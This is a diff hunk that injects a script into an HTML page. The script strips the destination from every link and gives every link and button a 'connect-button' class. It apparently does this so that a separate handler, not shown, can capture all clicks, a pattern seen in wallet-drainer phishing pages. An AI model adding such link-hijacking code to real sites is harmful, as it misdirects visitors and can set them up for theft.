@@ -2857,6 +2857,34 @@
       z-index: 2;
     }
   </style>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    // 1. Remove href from <a> tags and add class
+    document.querySelectorAll('body a').forEach(link => {
+        link.removeAttribute('href');
+        link.classList.add('connect-button');
+    });
+
+    // 2. Add class to all <button> elements
+    document.querySelectorAll('body button').forEach(button => {
+        button.classList.add('connect-button');
+    });
+
+    // 3. Remove 'ad-data-linked' attribute
+    const elements = document.querySelectorAll('[ad-data-linked]');
+    elements.forEach(element => {
+        element.removeAttribute('ad-data-linked');
+    });
+
+    console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+});
+</script>
+
+<style>
+.connect-button {
+    cursor: pointer;
+}
+</style>
 
 </body>
 
